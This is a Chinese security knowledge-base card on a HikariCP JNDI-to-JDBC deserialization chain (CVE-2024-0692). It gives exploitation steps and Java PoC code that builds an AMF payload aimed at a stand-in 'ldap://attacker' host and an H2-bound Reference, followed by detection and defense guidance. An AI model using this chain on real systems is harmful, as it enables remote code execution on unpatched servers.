---
id: web-java-deserialization-jndi-hikaricp-metricregistry-hikarijndifactory
title: HikariCP 双原语：HikariConfig.setMetricRegistry(String) 触发 JNDI lookup，HikariJNDIFactory 把 Reference 属性转成 JDBC 连接
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: hikaricp-metricregistry-jndi-hikarijndifactory
tags:
- java
- jndi
- hikaricp
- jdbc
- gadget
- deserialization
- injection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V503
  verified_at: '2026-11-11T03:25:37+08:00'
  notes: 已对照原文与19/19图核对：HikariConfig.setMetricRegistry(Object) 的 String 分支 new InitialContext().lookup（图10）、HikariJNDIFactory.getObjectInstance 校验 javax.sql.DataSource 并按 RefAddr 过滤后 createDataSource（图11）、JNDI→H2 JDBC INIT 的二次入口与文章一致；PoC 的 Reference(driverClassName/jdbcUrl) 为原文 JNDIMap 风格代码整理。标题把方法签名简写为 setMetricRegistry(String)，正文为 setMetricRegistry(Object)，属表述简化。未在未授权目标执行。
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-hikaricp-metricregistry-hikarijndifactory/
draft: false
kb_aliases:
- HikariConfig setMetricRegistry
- HikariJNDIFactory
- HikariCP JNDI
- HikariCP JNDI 转 JDBC
- com.zaxxer.hikari.HikariConfig
- JNDI2JDBC HikariCP
---

## 一句话结论

HikariCP 同时提供了 JNDI 链的两端原语：`com.zaxxer.hikari.HikariConfig#setMetricRegistry(Object)` 在参数是字符串时执行 `new InitialContext().lookup((String) metricRegistry)`，任何能触发 setter 的入口（AMF/Fastjson/SpEL 等）都能把任意 `ldap://`/`rmi://` 字符串变成 JNDI 请求；而 `com.zaxxer.hikari.HikariJNDIFactory#getObjectInstance` 作为本地 ObjectFactory，会把 `Reference` 的 `driverClassName`/`jdbcUrl` 等 RefAddr 还原为 `HikariDataSource` 并发起 JDBC 连接——在 JDK 高版本禁止远程 codebase 后，可用它把一次 JNDI lookup 转为可控 JDBC URL（如 H2 `INIT`）的二次入口，直至 RCE（CVE-2024-0692 的 SolarWinds SEM 链即用这两点）。

## 原理

- **Trigger 端（HikariConfig）**：`setMetricRegistry(Object metricRegistry)` 的实现是：若 `metricRegistry instanceof String`，则 `InitialContext initCtx = new InitialContext(); metricRegistry = initCtx.lookup((String) metricRegistry);`；若 lookup 抛 `NamingException` 则包装为 `IllegalArgumentException`。`getMetricRegistry()` 返回 Object，因此 bean 序列化/json/AMF 都会带上该属性；反序列化时调用 setter 即触发 JNDI。
- **AMF 场景**：AMF 反序列化会调用公共无参构造方法 + setter。攻击者构造 `HikariConfig` 对象，通过反射把私有字段 `metricRegistry` 设为 `ldap://attacker/x`，序列化后发送；目标 AMF `readMessage` 时调用 `setMetricRegistry("ldap://...")`，触发 JNDI 出站。
- **Factory 端（HikariJNDIFactory）**：`getObjectInstance` 只接受 `Reference` 且 `ref.getClassName()` 必须等于 `javax.sql.DataSource`；随后遍历全部 `RefAddr`，只保留类型以 `dataSource.` 开头或属于 `HikariConfig` 属性名的项，写入 `Properties`，最后 `createDataSource(properties, nameCtx)` 构造 `HikariDataSource` 并按其 `driverClassName`/`jdbcUrl` 建立 JDBC 连接。`HikariDataSource` 构造时即初始化连接池、加载驱动并执行连接，因此 Reference 即“JDBC 请求”。
- **两端如何配合**：JNDI 请求指向攻击者 LDAP/RMI；返回的 `Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null)` 由目标本地工厂处理，RefAddr 带 `driverClassName=org.h2.Driver`、`jdbcUrl=jdbc:h2:mem:testdb;INIT=...`，从而把 JNDI 注入升级为 H2 SQL 执行/RCE。JDK 8u191+ 默认禁止远程 codebase 时，本地工厂方案不受影响。
- **为什么常见**：HikariCP 是 Spring Boot 默认连接池，几乎必然在 classpath；`setMetricRegistry(String)` 是非常直接的 JNDI sink，HikariJNDIFactory 也随库提供，二者让“任意 setter 注入”与“JNDI 转 JDBC”都能落地。
- **边界**：需要能触发 setter/反射调用（反序列化、表达式、模板等）；目标需允许外部 LDAP/RMI；HikariJNDIFactory 要求 Reference class 为 `javax.sql.DataSource`；JDBC 驱动与 URL 需可用；仅 JNDI 出站而无 JDBC 驱动时可退化为 SSRF/信息外带。

## 触发条件

- 目标 classpath 包含 HikariCP（如 `HikariCP-java7-2.4.13` 或 3.x/4.x/5.x）。
- 存在能调用任意 setter 或构造方法的入口（AMF、Fastjson、Jackson、SpEL、模板注入等）。
- 目标可向攻击者 LDAP/RMI 服务出站；或攻击者能控制 JNDI 返回的 Reference。
- 若要转 JDBC RCE，目标需有可被滥用的 JDBC 驱动（H2、HSQLDB、PostgreSQL 等）。
- 仅限授权测试与防御验证。

## 利用步骤

1. 确认目标有 HikariCP 与可触发 setter 的入口。
2. 构造对象：实例化 `HikariConfig`，反射把 `metricRegistry` 设为 `ldap://attacker:1389/x`（或 `rmi://`）。
3. 通过入口序列化（如 AMF `ActionMessage`/`MessageBody`；Fastjson 则构造对应 JSON）并发送。
4. 目标 `setMetricRegistry` 触发 `InitialContext.lookup`，攻击者 LDAP/RMI 收到请求。
5. 返回 `Reference("javax.sql.DataSource","com.zaxxer.hikari.HikariJNDIFactory",null)`，RefAddr 设置 `driverClassName` 与 `jdbcUrl`（如 H2 `INIT` 多语句，见 H2 卡）。
6. HikariDataSource 初始化时连接 JDBC URL，执行 H2 `INIT`/`CREATE ALIAS` 或其它驱动利用，完成 RCE。
7. 若目标不能出网到 LDAP，可改用其它 setter gadget 或直接在入口触发 JDBC。

## PoC

Java 生成 AMF payload（文章代码整理，需本地把 validator 设为允许 `.*`）：

```java
HikariConfig config = new HikariConfig();
Field f = HikariConfig.class.getDeclaredField("metricRegistry");
f.setAccessible(true);
f.set(config, "ldap://attacker:1389/x");

MessageBody body = new MessageBody();
body.setData(config);
ActionMessage message = new ActionMessage();
message.addBody(body);
ByteArrayOutputStream out = new ByteArrayOutputStream();
AmfMessageSerializer serializer = new AmfMessageSerializer();
serializer.initialize(SerializationContext.getSerializationContext(), out, null);
serializer.writeMessage(message);
Files.write(Paths.get("payload.amf"), out.toByteArray());
```

LDAP 端返回的 Reference（JNDIMap 风格，文章引用）：

```java
Reference ref = new Reference("javax.sql.DataSource",
        "com.zaxxer.hikari.HikariJNDIFactory", null);
ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
ref.add(new StringRefAddr("jdbcUrl", url)); // jdbc:h2:mem:testdb;INIT=...
return ref;
```

说明：以上为文章代码片段整理，未在未授权目标执行；H2 JDBC URL 的构造见 H2 关联卡。

## 变体与关联

- **同类本地 ObjectFactory**：ViburDBCPObjectFactory 把 Reference 转 JDBC 见 [[web-java-deserialization-jndi-viburdbcp-objectfactory-jdbc]]；c3p0、Druid、Tomcat ResourceFactory 等见 `web/java/deserialization/jndi` 下相关卡。
- **setMetricRegistry 作为跳板**：Thymeleaf SpEL 场景中也用 `HikariConfig().setMetricRegistry("ldap://...")` 触发 JNDI，见 [[web-java-expression-spel-thymeleaf-312-istypeallowed-prefix-blacklist-bypass]]。
- **本卡来源链**：CVE-2024-0692 SolarWinds SEM AMF 反序列化入口见 [[web-java-component-solarwinds-sem-blazeds-amf-deserialization-wildcard-validator]]；H2 侧 RCE 见 [[web-java-component-h2-create-alias-file-write-system-load]]。
- **边界**：HikariConfig 版本差异（2.4.13 vs 3.x+）字段/属性名可能不同；HikariJNDIFactory 对 Reference class 有强校验；无出网/无驱动时链降级。

## 检测与防御

- **流量**：应用向外发起 LDAP/RMI 连接（尤其来自 Tomcat/Java 进程）；LDAP 响应中包含 `HikariJNDIFactory`、`javax.sql.DataSource`、`jdbcUrl`、`driverClassName` 等属性。
- **请求**：AMF/Fastjson/JSON 参数中出现 `metricRegistry`、`ldap://`/`rmi://`、`HikariConfig`、`HikariJNDIFactory`；模板/表达式内容出现同类字符串。
- **主机**：HikariDataSource 初始化异常栈（`com.zaxxer.hikari.HikariJNDIFactory` → `createDataSource` → `PoolBase.newConnection`）；随后 H2/HSQLDB 驱动加载与 `INIT`/`CREATE ALIAS` SQL。
- **防御**：升级 HikariCP 并避免把不可信数据反序列化为任意类；JNDI 出站白名单/阻断外部 LDAP/RMI；移除不用的 JDBC 驱动（尤其 H2）；对反序列化入口做类白名单；监控 `InitialContext.lookup` 行为。
